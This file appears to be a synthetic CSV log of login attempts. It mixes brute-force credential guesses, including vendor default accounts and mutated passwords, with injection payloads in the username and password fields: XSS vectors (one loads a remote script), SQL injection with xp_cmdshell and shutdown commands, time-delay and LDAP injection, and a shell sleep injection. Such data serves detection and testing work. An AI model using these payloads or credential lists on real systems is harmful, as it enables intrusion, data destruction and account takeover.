ip,username,password
119.7.193.103,"ABC<div style=""x:\xE3\x80\x80expression(javascript:alert(414)"">DEF",<script>javascript:alert(561)<\x00/script>
23.154.127.57,guo,.com.cn789
236.108.204.134,chu,50%database
64.88.73.85,ye,saad-emh1
219.112.86.104,cao,67asdfjkl;
200.229.78.242,sha,young50%
137.128.161.210,teng,123456789o~
236.23.10.99,--';,*/*
205.31.241.214,cai,asdfjkl;666
119.7.193.103,<b <script>alert(1497)</script>0,"'`""><\x00script>javascript:alert(1292)</script>"
23.154.127.57,guo,.com.cn789
236.108.204.134,chu,50%database
83.144.179.147,luan,y.itxrfcegth199
64.88.73.85,ye,saad-emh1
200.229.78.242,sha,youung50%
137.128.161.210,teng,123456789o~
219.112.86.104,cao,67asdfjkl;
83.144.179.147,luan,y.itxrfcegth199
119.7.193.103,"<img \x15141514src=x onerror=""javascript:alert(1514)"">",<IMG SRC=javascript:alert(1728))>
236.23.10.99,' (select top 1,or a=a
205.31.241.214,cai,asdfjkl;666
236.108.204.134,chu,50%dbatabase
23.154.127.57,guo,.com.cn789
64.88.73.85,ye,saad-emh1
219.112.86.104,cao,67asdfjkl;
200.229.78.242,sha,young50%
137.128.161.210,teng,123456789o~
205.31.241.214,cai,asdfjkl;666
119.7.193.103,&lt;IMG SRC=&quot; &amp;#14;  javascript:alert(1853);&quot;&gt;,"""`'><script>\xE2\x80\x85javascript:alert(509)</script>"
23.154.127.57,guo,.com.cn789
83.144.179.147,luan,y.itxrfcegth19q9
236.108.204.134,chu,50%database
236.23.10.99,' or uid like '%,tz_offset
64.88.73.85,ye,saad-emh1
200.229.78.242,sha,youngN0%
219.112.86.104,cao,67asdfjkl;
137.128.161.210,teng,123456789o~
205.31.241.214,cai,asdfjkl;666
119.7.193.103,"<input type=""text"" value=`` <div/onmouseover='alert(785)'>X</div>","<html onMouseOver html onMouseOver=""javascript:javascript:alert(1218)""></html onMouseOver>"
236.108.204.134,chu,50%database
83.144.179.147,luan,y.itxrfcegth199
236.23.10.99,""" or 0=0 --",hi' or 'a'='a
23.154.127.57,guo,.com.cn789
64.88.73.85,ye,saad-emh
200.229.78.242,sha,young50%
219.112.86.104,cao,67asdfjkl;
137.128.161.210,teng,123456789o~
236.23.10.99,') and ('x'='x,a' or 'a' = 'a
119.7.193.103,"<div style=""position:absolute;top:0;left:0;width:117500%;height:117500%"" onmouseover=""prompt(1175)"" onclick=""alert(1175)"">x</button>","\"";alert(1649);//"
23.154.127.57,guo,.com.cn789
236.108.204.134,chu,50%database
205.31.241.214,cai,asdfjkl;666
83.144.179.147,luan,y.itxrfcegth199
64.88.73.85,ye,saad-emh1
200.229.78.242,sha,young50%
219.112.86.104,qi,1/2graphic
137.128.161.210,teng,123456789o~
83.144.179.147,luan,y.itxrfcegth199
236.108.204.134,chu,50%database
119.7.193.103,"<script src=""#"">{alert(969)}</script>;969","<a href=""jav&#65ascript:javascript:alert(708)"">test708</a>"
205.31.241.214,cai,asTfjkl;666
23.154.127.57,guo,.com.cn789
236.23.10.99,' or user like '%,%2A%7C
64.88.73.85,ye,saad-emh1
219.112.86.104,qi,1/2graphic
67.91.75.234,bao,598@qq.com
200.229.78.242,sha,young50%
119.7.193.103,"<IFRAME SRC=# onmouseover=""alert(1137)""></IFRAME>","<img src=x onerror=\x00""javascript:alert(631)"">"
25.169.167.149,') and ('x'='x,%2A%28%7C%28objectclass%3D%2A%29%29
205.31.241.214,cai,asdfjkl;666
236.23.10.99,'||UTL_HTTP.REQUEST,//*
23.154.127.57,guo,.com.cn789
236.108.204.134,chu,50%database
64.88.73.85,ye,saad-emh1
219.112.86.104,qi,1/2graphic
200.229.78.242,sha,young50%
67.91.75.234,bao,598@qq.com
119.7.193.103,"<IMG SRC= onmouseover=""alert(724)"">","<a href=""\xE2\x80\xAFjavascript:javascript:alert(1356)"" id=""fuzzelement1356"">test</a>"
23.154.127.57,guo,lcom.cn789
205.31.241.214,cai,asdfjkl;666
236.108.204.134,chu,50%database
236.23.10.99,' or 1=1--,0 or 1=1
64.88.73.85,ye,saad-emh1
25.169.167.149,or 0=0 --,--';
200.229.78.242,sha,young50%
67.91.75.234,bao,598@qq.com
219.112.86.104,qi,1/2graphic
119.7.193.103,"<IMG SRC= onmouseover=""alert(1638)"">",<x onmouseout=alert(169)>hover this!
236.23.10.99,--sp_password,or%201=1
25.169.167.149,distinct,';shutdown--
23.154.127.57,guo,.com.cn789
64.88.73.85,ye,saad-emh1
205.31.241.214,cai,asdfjkl;666
236.108.204.134,chu,50%database
119.7.193.103,"""><img src=x onerror=javascript:alert(1459))>","<img \x34src=x onerror=""javascript:alert(1523)"">"
219.112.86.104,qi,1/2graphic
200.229.78.242,sha,young50%
67.91.75.234,bao,598@qq.com
205.31.241.214,cai,asdfjkl;666
236.23.10.99,"""a"""" or 1=1--""",(sqlattempt2)
25.169.167.149,%2A%28%7C%28mail%3D%2A%29%29,""" or 0=0 #"
23.154.127.57,guo,.com.cn789
64.88.73.85,ye,saad-emh1
236.108.204.134,chu,50%database
119.7.193.103,<<SCRIPT>alert(941);//<</SCRIPT>,"<meta http-equiv=""refresh"" content=""0;javascript&colon;alert(789)""/>"
219.112.86.104,qi,1/2graphic
200.229.78.242,sha,young50%
67.91.75.234,bao,598@qq.com
23.154.127.57,guo,.com.cn789
205.31.241.214,cai,asdfjkl;666
236.23.10.99,*|,replace
25.169.167.149,= --,bfilename
236.108.204.134,chu,50%database
64.88.73.85,ye,saad-emh1
23.154.127.57,guo,.com.cn789_
200.229.78.242,sha,young50%
119.7.193.103,"<style>@import ""data:,*%7bx:expression(javascript:alert(643))%7D"";</style>","<;DIV STYLE="";background-image: url(javascript:alert(1880))"";>;"
219.112.86.104,qi,1/2graphic
67.91.75.234,bao,598@qqcom
236.23.10.99,%2A%7C,or a = a
25.169.167.149,1;SELECT%20*,""" or 1=1 or """"="""
205.31.241.214,cai,asdfjkl;666
64.88.73.85,ye,saad-emh1
236.108.204.134,chu,50%database
119.7.193.103,&lt;STYLE type=&quot;text/css&quot;&gt;BODY{background:url(&quot;javascript:alert(1831)&quot;)}&lt;/STYLE&gt;,"&lt;IMG SRC=\""jav&#x0D;ascript&#058;alert(922);\""&gt;"
219.112.86.104,qi,1/2graphic
67.91.75.234,bao,598@qq.com
23.154.127.57,guo,.com.cn789
200.229.78.242,sha,young50%
236.23.10.99,handler,or
25.169.167.149,handler,a' waitfor delay '0:0:10'--
205.31.241.214,cai,asdfjk9;666
236.108.204.134,chu,50%database
64.88.73.85,ye,saad-emh1
219.112.86.104,qi,1/2graphic
119.7.193.103,<script ~~~>alert(818)</script ~~~>,"<a href=""\x1382Ejavascript:javascript:alert(1382)"" id=""fuzzelement1382"">test</a>"
200.229.78.242,sha,young50%
236.23.10.99,"<>""'%;)(&+",' or '1'='1'--
67.91.75.234,bao,598@qq.com
23.154.127.57,guo,.com.cn789
236.108.204.134,chu,50kdatabase
25.169.167.149,or 0=0 #,x' OR full_name LIKE '%Bob%
205.31.241.214,cha,&00aa00bb
64.88.73.85,ye,saad-emh1
236.23.10.99,'||UTL_HTTP.REQUEST,' or 0=0 --
200.229.78.242,sha,young50%
219.112.86.104,qi,1/2graphic
23.154.127.57,guo,.com.cn789
119.7.193.103,"""`'><script>\x21430javascript:alert(1430)</script>","<a href=""javascript\x0D:javascript:alert(489)"" id=""fuzzelement489"">test</a>"
67.91.75.234,bao,598@qq.com
236.108.204.134,chu,50%database
205.31.241.214,cha,&00aa00bb
25.169.167.149,"or 0=0 #""",%2A%28%7C%28mail%3D%2A%29%29
64.88.73.85,ye,saad-emh1
119.7.193.103,"<TABLE><TD BACKGROUND=""javascript:javascript:alert(682)"">","<;BODY BACKGROUND="";javascript:alert(1878);"";>;"
23.154.127.57,guo,.com.cn789
236.23.10.99,&lt;&gt;&quot;'%;)(&amp;+,like
200.229.78.242,sha,young50%
67.91.75.234,bao,598@qq.com
219.112.86.104,qi,1/2graphic
25.169.167.149,PRINT @@variable,or%201=1
205.31.241.214,cha,&00aa00bb
236.108.204.134,chu,50%database
64.88.73.85,ye,sad-emh1
23.154.127.57,mi,xs_vk1
67.91.75.234,bao,598@qq.com
236.23.10.99,tz_offset,x' AND members.email IS NULL; --
219.112.86.104,qi,1/2graphic
119.7.193.103,"<IMG SRC=x onratechange=""alert(1121))"">","<META HTTP-EQUIV=""Set-Cookie"" Content=""USERID=<SCRIPT>alert(1048)</SCRIPT>"">"
25.169.167.149,' or ''=','sqlattempt1
205.31.241.214,cha,&00aa00bb
200.229.78.242,sha,young50%
236.108.204.134,chu,50%database
64.88.73.85,ye,saad-emh1
236.23.10.99,' or '1'='1'--,'%20or%20'x'='x
23.154.127.57,mi,xsP_vk1
144.8.126.54,pan,e-mailp33
219.112.86.104,qi,1/2graphic
67.91.75.234,bao,598@qq.com
25.169.167.149,' or 1=1,--
236.108.204.134,chu,50%database
200.229.78.242,sha,young50%
205.31.241.214,cha,&00aa00bb
64.88.73.85,ye,saad-emh1
219.112.86.104,qi,1/2graphic
86.186.47.233,"ABC<div style=""x:\xE3\x80\x80expression(javascript:alert(414)"">DEF",&lt;TABLE BACKGROUND=&quot;javascript:alert(1833)&quot;&gt;&lt;/TABLE&gt;
23.154.127.57,mi,xs_vk1
67.91.75.234,bao,598@qq.com
144.8.126.54,pan,e-mail233
25.169.167.149,insert,' or 1=1
236.108.204.134,chu,50%database
205.31.241.214,cha,&00aa00bb
200.229.78.242,sha,young50%
64.88.73.85,ye,saad-emh1
86.186.47.233,"""`'><script>\xE2\x80\x80javascript:alert(530)</script>","<script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('javascript:alert(651)')()</script>"
144.8.126.54,pan,e-mail233
23.154.127.57,mi,xs_vk1
219.112.86.104,qi,1/2graphic
67.91.75.234,bao,598@qq.com
25.169.167.149,') or ('a'='a,@variable
236.108.204.134,chu,50%database
200.229.78.242,sha,young50%
205.31.241.214,cha,&00aa00bb
64.88.73.85,murong,1/2zMxcvbnm
144.8.126.54,pan,e-mail233
219.112.86.104,qi,1/2graphic
86.186.47.233,<IMG “””><SCRIPT>alert(840)</SCRIPT>”>,"<li style=list-style:url() onerror=javascript:alert(579)> <div style=content:url(data:image/svg+xml,%%3Csvg/%%3E);visibility:hidden onload=javascript:alert(579)></div>"
67.91.75.234,bao,598@qq.com
23.154.127.57,mi,xs_vk1
205.31.241.214,cha,&00aa00bb
200.229.78.242,zang,a1b2c3d4)
25.169.167.149,%27%20or%201=1,%27%20or%201=1
236.108.204.134,chu,50%database
64.88.73.85,murong,1/2zxcvbnm
219.112.86.104,qi,1/2graphic
144.8.126.54,pan,e-mail233
86.186.47.233,"<IMG SRC=# onmouseover=""alert(723)"">",<IMG SRC=”javascript:alert(804);”>
23.154.127.57,mi,xs_vk1
67.91.75.234,bao,598@qq.com
205.31.241.214,cha,&00aa00bb
243.233.114.206,',limit
200.229.78.242,zang,a1b2c3d4)
25.169.167.149,'||UTL_HTTP.REQUEST,as
64.88.73.85,murong,1/2zxcvbnm
219.112.86.104,qi,1/2graphic
67.91.75.234,bao,598@qq.om
23.154.127.57,mi,x_vk1
86.186.47.233,"<IMG SRC=x onshow=""alert(1129))"">","<a href=""\x09javascript:javascript:alert(1352)"" id=""fuzzelement1352"">test</a>"
144.8.126.54,pan,e-mil233
200.229.78.242,zang,a1b2c3d4)
25.169.167.149,%20or%20x=x,' or 1=1
243.233.114.206,= ',' (select top 1
205.31.241.214,cha,&00aa00bb
64.88.73.85,murong,1/2zxcvbnm
219.112.86.104,qi,1/2graphic
86.186.47.233,"<BGSOUND SRC=""javascript:alert(1657);"">","<svg onunload svg onunload=""javascript:javascript:alert(1235)""></svg onunload>"
144.8.126.54,pan,e-mail233
67.91.75.234,bao,598@qq.com
23.154.127.57,mi,xs_vk1
200.229.78.242,zang,a1b2c3d4)
25.169.167.149,' ;,' or 'x'='x
243.233.114.206,) or (a=a,'%20or%20'x'='x
205.31.241.214,cha,&00aa00bb
64.88.73.85,murong,1/2zxcvbnm
144.8.126.54,pan,e-mail233
23.154.127.57,mi,xs_vk1
25.169.167.149,' or '1'='1'--,' or 1=1 or ''='
243.233.114.206,' or (EXISTS),) or (a=a
219.112.86.104,qi,1/2graphic
205.31.241.214,cha,&00aa00bb
200.229.78.242,zang,a1b2c3d4)
67.91.75.234,bao,598@qq.com
86.186.47.233,<body onscroll=alert(145)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><x id=x>#x,"<;STYLE>;.XSS{background-image:url("";javascript:alert(1899)"";);}<;/STYLE>;<;A CLASS=XSS>;<;/A>;"
64.88.73.85,murong,1/2zxcvbnm
144.8.126.54,pan,e-mail233
67.91.75.234,bao,598@qq.com
205.31.241.214,cha,&00aa00bb
200.229.78.242,zang,a1b2c3d4)
243.233.114.206,"hi or 1=1 --""",truncate
23.154.127.57,mi,xs_vk1
25.169.167.149,hi' or 'a'='a,(sqlattempt2)
162.139.57.205,\x27,""""
86.186.47.233,"ABC<div style=""x:expression\x5C(javascript:alert(408)"">DEF","""`'><script>\x20javascript:alert(536)</script>"
64.88.73.85,murong,1/2zxcvbnm
144.8.126.54,pan,e-mail233
205.31.241.214,cha,&00aa00bb
200.229.78.242,zang,a1b2c3d4)
162.139.57.205,' or uname like '%,exec xp
67.91.75.234,bao,598@qq.com
86.186.47.233,"""`'><script>\xEF\xBF\xBEjavascript:alert(529)</script>","""`'><script>\x00javascript:alert(511)</script>"
23.154.127.57,mi,xs_vk1
25.169.167.149,or 0=0 #,\x3D \x3B'
243.233.114.206,' or userid like '%,' or (EXISTS)
64.88.73.85,murong,1/2zxcvbnm
144.8.126.54,pan,e-mail233
200.229.78.242,zang,a1b2c3d4)
205.31.241.214,cha,&00aa00bb
86.186.47.233,"<body onkeydown body onkeydown=""javascript:javascript:alert(1245)""></body onkeydown>",&lt;XML ID=&quot;xss&quot;&gt;&lt;I&gt;&lt;B&gt;&lt;IMG SRC=&quot;javas&lt;!-- --&gt;cript:alert(1836)&quot;&gt;&lt;/B&gt;&lt;/I&gt;&lt;/XML&gt;
25.169.167.149,1 waitfor delay '0:0:10'--,' UNION SELECT
23.154.127.57,mi,xs_vk1
243.233.114.206,or%201=1,' or uname like '%
162.139.57.205,\x27,' or uname like '%
64.88.73.85,murong,1/2zxcvbnm
67.91.75.234,jiao,xena21.
144.8.126.54,pan,e-mail233
200.229.78.242,zang,a1b2c3d4)
205.31.241.214,cha,&00aa00bb
162.139.57.205,'; exec xp_regread,'or'='or'
23.154.127.57,mi,xs_vk1
67.91.75.234,jiao,xena21.
64.88.73.85,murong,1/2zxcvbnm
243.233.114.206,' or ''=',\x27UNION SELECT
86.186.47.233,"<BODY onload!#$%%&()*~+-_.,:;?@[/|\]^`=javascript:alert(669)>","</ foo=""><script>javascript:alert(1507)</script>"">"
25.169.167.149,""" or 1=1--",%27%20or%201=1
144.8.126.54,pan,e-mail233
205.31.241.214,cha,&00aa00bb
200.229.78.242,zang,a1b2c3d4)
162.139.57.205,*|,hi' or 1=1 --
67.91.75.234,jiao,xena21.
243.233.114.206,or 0=0 --,'||UTL_HTTP.REQUEST
23.154.127.57,mi,xs_vk1
64.88.73.85,murong,1/2zxcvbnm
25.169.167.149,"""a"""" or 3=3--""",%7C
86.186.47.233,<brute onmouseout=alert(187)>hover this!,"<IMG SRC=""javascript:javascript:alert(670)"""
144.8.126.54,pan,e-mail233
200.229.78.242,zang,a1b2c3d4)
205.31.241.214,cha,&00aa00bb
64.88.73.85,murong,1/2zxcvbnm
23.154.127.57,mi,xs_vk1
67.91.75.234,jiao,xena21.
243.233.114.206,\x23,') or ('a'='a
162.139.57.205,"""",%28
25.169.167.149,or,%20'sleep%2050'
86.186.47.233,""">/XaDoS/><script>alert(1774)</script><script src=""http://www.site.com/XSS.js""></script>",&lt;STYLE&gt;@im\port'\ja\vasc\ript&#58;alert(899)';&lt;/STYLE&gt;
144.8.126.54,pan,e-mail233j
200.229.78.242,zang,a1b2c3d4)
205.31.241.214,cha,&00aa00bb
23.154.127.57,mi,xs_vk1
162.139.57.205,PRINT @@variable,exec sp
67.91.75.234,jiao,xena21.
243.233.114.206,' or 1=1--,1 waitfor delay '0:0:10'--
64.88.73.85,murong,1/2zxcvbnm
25.169.167.149,distinct,\x27\x4F\x52 SELECT *
86.186.47.233,"<a href=""\x0Fjavascript:javascript:alert(435)"" id=""fuzzelement435"">test</a>",</XSS/*-*/STYLE=xss:e/**/xpression(alert(1938))>
144.8.126.54,pan,e-mail233
200.229.78.242,zang,a1b2c3d4)
205.31.241.214,cha,&00aa00bb
86.186.47.233,<IMG SRC=`javascript:javascript:alert(1578)`>,"<a href=""\xE1362\x9A\x80javascript:javascript:alert(1362)"" id=""fuzzelement1362"">test</a>"
64.88.73.85,murong,1/2zxcvbnm
162.139.57.205,%2A%28%7C%28mail%3D%2A%29%29,"<>""'%;)(&+"
67.91.75.234,jiao,xena21.
23.154.127.57,mi,xs_vk1
25.169.167.149,or,' or 1=1 or ''='
243.233.114.206,*(|(mail=*)),'; exec master..xp_cmdshell
144.8.126.54,pan,e-mail233
200.229.78.242,zang,a1b2c3d4) 
205.31.241.214,cha,&00aa00bb
162.139.57.205,declare @q nvarchar (200) 0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q),t'exec master..xp_cmdshell 'nslookup www.google.com'--
64.88.73.85,murong,1/2zxcvbnm
23.154.127.57,mi,xs_vk1T
86.186.47.233,"`""'><img src='#\x27 onerror=javascript:alert(363)>","<script\x20type=""text/javascript"">javascript:alert(1177);</script>"
243.233.114.206,'hi' or 'x'='x';,//
25.169.167.149,'%20or%201=1,' and 2>1--
67.91.75.234,jiao,xena21.
144.8.126.54,pan,e-mail233
205.31.241.214,cha,&00aa00bb
200.229.78.242,zang,a1b2c3d4)
162.139.57.205,' or uname like '%,1;SELECT%20*
86.186.47.233,"<input type=""text"" value=`` <div/onmouseover='alert(785)'>X</div>","<TABLE BACKGROUND=""javascript:alert(949)"">"
23.154.127.57,mi,xs_vk1
64.88.73.85,murong,1/2zxcvbnm
243.233.114.206,'%20or%201=1,' UNION SELECT
67.91.75.234,jiao,xena21.
25.169.167.149,' or user like '%,%2A%28%7C%28objectclass%3D%2A%29%29
144.8.126.54,pan,e-mail233
200.229.78.242,zang,a1b2c3d4)
205.31.241.214,cha,&00aa00bb
128.165.215.15,like,*(|(mail=*))
64.88.73.85,murong,1/2zxcvbnm
86.186.47.233,"<img \x6012src=x onerror=""javascript:alert(601)"">","<IMG SRC=x onloadedmetadata=""alert(1115))"">"
23.154.127.57,mi,xs_vk1
162.139.57.205,x' OR full_name LIKE '%Bob%,"""hi"""") or (""""a""""=""""a"""
144.8.126.54,pan,e-mail233
243.233.114.206,as,%2A%7C
67.91.75.234,jiao,xena21.
205.31.241.214,cha,&00aa00bb
200.229.78.242,zang,a1b2c3d4)
144.8.126.54,pan,e-mail233
162.139.57.205,*(|(objectclass=*)),or 0=0 #
243.233.114.206,' or username like '%,'; exec master..xp_cmdshell 'ping 172.10.1.255'--
128.165.215.15,tz_offset,'hi' or 'x'='x';
86.186.47.233,<embed code=javascript:javascript:alert(1617);></embed>,"<BASE HREF=""javascript:alert(765);//"">"
23.154.127.57,mi,xs_vk1
64.88.73.85,murong,1/2zxcvbnm
67.91.75.234,jiao,xena21.
205.31.241.214,cha,&00aa00bb
200.229.78.242,zang,a1b2c3d4)
86.186.47.233,"<script onLoad script onLoad=""javascript:javascript:alert(1217)""></script onLoad>","""><h1><IFRAME SRC=# onmouseover=""alert(1143)""></IFRAME>123</h1>"
23.154.127.57,mi,xs_vk1
144.8.126.54,pan,e-mail233
67.91.75.234,jiao,xena21.
128.165.215.15,' or 0=0 --,or 0=0 --
162.139.57.205,%2A%28%7C%28mail%3D%2A%29%29,1;SELECT%20*
243.233.114.206,' or username like '%,",@variable"
64.88.73.85,murong,1/2zxcvfnm
205.31.241.214,cha,&00aa00b
200.229.78.242,zang,a1b2c3d4)
151.240.101.171,AQDEMO,Vision2
234.26.240.139,cui,@163.com666
243.233.114.206,'%20or%201=1,or%201=1
128.165.215.15,hi' or 'a'='a,""" or 0=0 --"
205.31.241.214,cha,&00aa00bb
200.229.78.242,zang,a1b2c3d4)
162.139.57.205,' or 1=1--,"""hi"""") or (""""a""""=""""a"""
23.154.127.57,mi,xs_vk1
64.88.73.85,murong,1/2zxcvbnm
67.91.75.234,jiao,xena21.
151.240.101.171,AQDEMO,sangfor@2018
128.165.215.15,%2A%28%7C%28objectclass%3D%2A%29%29,|
234.26.240.139,cui,@163.com666
243.233.114.206,procedure,(sqlattempt2)
200.229.78.242,zang,a1b2c3d4)
23.154.127.57,mi,xs_vk1
67.91.75.234,jiao,xena21.
39.111.41.62,' or username like '%,' or (EXISTS)
162.139.57.205,""" or 0=0 --",' or user like '%
205.31.241.214,cha,&00aa00bb
151.240.101.171,AQDEMO,Changeme_123。
128.165.215.15,x' AND 1=(SELECT COUNT(*) FROM tabname); --,"hi"" or 1=1 --"
234.26.240.139,cui,@163.com666
243.233.114.206,""" or ""a""=""a",' or username like '%
39.111.41.62,//*,%29
162.139.57.205,"hi or 1=1 --""",' or username like '%
40.186.220.74,deng,Nov-94
23.154.127.57,mi,xs_vk1
67.91.75.234,jiao,xena21.
200.229.78.242,zang,a1b2c3d4)
128.165.215.15,&apos;%20OR,/
151.240.101.171,AQDEMO,waav
243.233.114.206,' or a=a--,%21
234.26.240.139,cui,@163.com666
23.154.127.57,mi,xs_k1
39.111.41.62,declare @s varchar(200) select @s = 0x77616974666F722064656C61792027303A303A31302700 exec(@s),declare @q nvarchar (200) 0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q)
162.139.57.205,' or user like '%,*/*
40.186.220.74,deng,Nov-94
67.91.75.234,jiao,xena21.
200.229.78.242,zang,a1b2c3d4)
151.240.101.171,AQDEMO,KEYSCAN
128.165.215.15,%2A%28%7C%28mail%3D%2A%29%29,*/*
234.26.240.139,cui,@163.com666
243.233.114.206,'hi' or 'x'='x';,|
162.139.57.205,//*,' or a=a--
39.111.41.62,desc,' or 0=0 --
209.138.114.179,redline,system
40.186.220.74,deng,Nov-94
200.229.78.242,zang,a1b2c3d4)
67.91.75.234,jiao,xena21.
151.240.101.171,AQDEMO,vizxv
128.165.215.15,select,' or 1=1 or ''='
243.233.114.206,--sp_password,%2A%28%7C%28mail%3D%2A%29%29
234.26.240.139,cui,@163.com66&
40.186.220.74,deng,Nov-94
209.138.114.179,redline,converge
162.139.57.205,desc,' and 2>3--
39.111.41.62,replace,or a=a
67.91.75.234,jiao,xena21.
200.229.78.242,zang,a1b2c3d4)
128.165.215.15,or 0=0 --,%2A%7C
151.240.101.171,AQDEMO,123456789a
234.26.240.139,cui,@163.com666
243.233.114.206,' or ''=',order by
40.186.220.74,deng,Nov-94
209.138.114.179,redline,digicel
162.139.57.205,' or username like '%,' or user like '%
39.111.41.62,(sqlattempt2),--sp_password
67.91.75.234,jiao,xena21.
200.229.78.242,zang,a1b2c3d4)
151.240.101.171,dcmadmin,games
128.165.215.15,asc,%29
234.26.240.139,cui,@163.com666
243.233.114.206,hi') or ('a'='a,@variable
209.138.114.179,redline,michelle
200.229.78.242,zang,a1b2c3d4)
162.139.57.205,' or 0=0 --,' or uname like '%
40.186.220.74,deng,Nov-94
67.91.75.234,jiao,xena21.
39.111.41.62,"or 1=1 or """"=",%2A%28%7C%28objectclass%3D%2A%29%29
151.240.101.171,dcmadmin,234
128.165.215.15,\x27UNION SELECT,' or 1=1--
234.26.240.139,cui,@163.com666
125.180.128.15,'; exec xp_regread,' and '' like '%
209.138.114.179,redline,informix
123.185.14.109,QS_ADM,hipchat
39.111.41.62,' and '' like '%,--
67.91.75.234,jiao,xena21
162.139.57.205,insert,""" or ""x""=""x"
40.186.220.74,deng,Nov-94
128.165.215.15,%7C,@variable
151.240.101.171,dcmadmin,1RRWTTOOI
125.180.128.15,//*,declare @q nvarchar (200) 0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q)
234.26.240.139,cui,@163.com666
39.111.41.62,' or '1'='1'--,'||UTL_HTTP.REQUEST
162.139.57.205,%27%20or%201=1,as
40.186.220.74,deng,Nov-94
123.185.14.109,QS_ADM,lp
209.138.114.179,redline,builtin
67.91.75.234,ding,@139.com3721
128.165.215.15,declare @s varchar(200) select @s = 0x77616974666F722064656C61792027303A303A31302700 exec(@s),1;SELECT%20*
151.240.101.171,dcmadmin,enable
125.180.128.15,' or '' like ',&lt;&gt;&quot;'%;)(&amp;+
234.26.240.139,cui,@163.com666
123.185.14.109,QS_ADM,Password1234
40.186.220.74,deng,Nov-94
67.91.75.234,ding,@139.com3721
162.139.57.205,distinct,';shutdown--
209.138.114.179,acer,pento
39.111.41.62,%20'sleep%2050',\x27UNION SELECT
151.240.101.171,dcmadmin,23646
128.165.215.15,x' AND userid IS NULL; --,'
125.180.128.15,or a = a,(
234.26.240.139,cui,@163.com666
209.138.114.179,acer,d.e.b.u.g
196.134.157.27,tian,1/3connect
123.185.14.109,QS_ADM,store
39.111.41.62,--';,%2A%7C
40.186.220.74,deng,Nov-94
67.91.75.234,ding,@139.com3721
128.165.215.15,' or 1=1 or ''=',23 OR 1=1
151.240.101.171,dcmadmin,QS
234.26.240.139,cui,@163.com666
125.180.128.15,*/*,--
123.185.14.109,QS_ADM,123456789
39.111.41.62,//,')%20or%20('x'='x
151.240.101.171,dcmadmin,cacadmin
196.134.157.27,tian,1/3connect
40.186.220.74,deng,Nov-94
67.91.75.234,ding,@139.com3721
209.138.114.179,acer,0P3N
128.165.215.15,hi' or 1=1 --,' and '' like ''--
125.180.128.15,|,0 or 1=1
234.26.240.139,cui,@163.com666
40.186.220.74,deng,Nov-94
196.134.157.27,tian,1/3connejt
151.240.101.171,cxsdk,service
209.138.114.179,acer,TURBINE
67.91.75.234,ding,@139.com3721
123.185.14.109,hqadmin,WANGTEK
128.165.215.15,') and ('x'='x,x' AND email IS NULL; --
39.111.41.62,hi' or 'a'='a,%20$(sleep%2050)
234.26.240.139,cui,@163.com666
125.180.128.15,%2A%28%7C%28objectclass%3D%2A%29%29,'%20or%201=1
40.186.220.74,deng,Nov-94
234.26.240.139,cui,@163.com666
151.240.101.171,cxsdk,111111a
125.180.128.15,%26,%29
67.91.75.234,ding,@139.com3721
123.185.14.109,hqadmin,dasusr1
128.165.215.15,desc,'
39.111.41.62,&lt;&gt;&quot;'%;)(&amp;+,exec sp
209.138.114.179,acer,MTRPW
196.134.157.27,tian,1/3connect
40.186.220.74,deng,Nov-94
196.134.157.27,tian,1/3connect
39.111.41.62,like,\x3D \x27
209.138.114.179,OLAPDBA,19920706
67.91.75.234,ding,@139.com3721
125.180.128.15,distinct,exec xp
234.26.240.139,cui,@163.com666
128.165.215.15,//,'%20or%20''='
151.240.101.171,cxsdk,DIP
123.185.14.109,hqadmin,shell
40.186.220.74,deng,Nov-94
209.138.114.179,OLAPDBA,sangfor@2019
39.111.41.62,' or 1=1--,desc
67.91.75.234,ding,@139.com3721
125.180.128.15,= ',%7C
234.26.240.139,cui,@163.com666
151.240.101.171,cxsdk,MGR.SYS
123.185.14.109,hqadmin,1qaz!QAZ
196.134.157.27,tian,1/3connect
128.165.215.15,or 0=0 --,' or 1=1--
40.186.220.74,deng,Nov-94
39.111.41.62,*|,or
196.134.157.27,tian,1/3connect
123.185.14.109,hqadmin,adslroot
209.138.114.179,OLAPDBA,DISC
234.26.240.139,cui,@163.com666
151.240.101.171,cxsdk,TOAD
128.165.215.15,x' AND members.email IS NULL; --,desc
67.91.75.234,ding,@139.com3721
125.180.128.15,%28,PRINT @@variable
40.186.220.74,deng,Nov-94
196.134.157.27,tian,1/3connect
123.185.14.109,hqadmin,MGR.SYS
